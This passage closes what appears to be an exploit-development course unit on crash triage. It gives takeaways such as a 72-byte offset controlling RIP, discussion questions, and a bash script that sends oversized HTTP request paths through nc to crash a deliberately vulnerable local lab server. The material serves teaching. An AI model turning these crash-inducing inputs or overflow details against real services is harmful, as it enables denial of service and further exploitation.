3.  **Reproducibility is King**: All PoCs achieve 100% reliability because the bugs are deterministic.
4.  **Report for the Audience**: The vulnerability report includes both technical details (for developers) and severity ratings (for management).
5.  **Stack Overflow = RIP Control**: The 72-byte offset gives direct control over the return address.

### Discussion Questions

1.  Why does the stack overflow require 72 bytes to control RIP (not 64)?
2.  How would ASLR affect exploitation of the stack overflow in `vuln_protected`?
3.  Why is the NULL pointer dereference classified as NOT_EXPLOITABLE while the others are EXPLOITABLE?
4.  How would you extend this analysis to include the `vuln_http_server` network target?

### Bonus Challenge: Network Target Analysis

Extend the capstone to include the `vuln_http_server` from Day 4:

```bash
cd ~/crash_analysis_lab/capstone

# Generate HTTP server crashes with long paths
for size in 100 500 1000 2000; do
    python3 -c "import sys; sys.stdout.buffer.write(b'GET /' + b'X'*$size + b' HTTP/1.1\r\n\r\n')" > crashes/http_path_${size}.bin
done

# Test with non-ASAN binary (will show heap corruption on free)
../vuln_http_server &
SERVER_PID=$!
sleep 1

for crash in crashes/http_path_*.bin; do
    echo "Testing $(basename $crash)..."
    cat "$crash" | nc localhost 8888 || true
    sleep 0.5

    if ! kill -0 $SERVER_PID 2>/dev/null; then
        echo "  Server crashed!"
        ../vuln_http_server &
        SERVER_PID=$!
        sleep 1
    fi
done

kill $SERVER_PID 2>/dev/null
```

This adds a **network-accessible** vulnerability to your report and demonstrates an important lesson: **sanitizers have blind spots** - always use multiple detection methods.

### Looking Ahead to Week 5

Next week, we cross the Rubicon. You have the crash, you have the PoC, and you know it's exploitable. Now, we **build the exploit**. We will start with basic stack overflows, defeat simple mitigations, and learn to turn that instruction pointer overwrite into code execution.

<!-- Written by AnotherOne from @Pwn3rzs Telegram channel -->


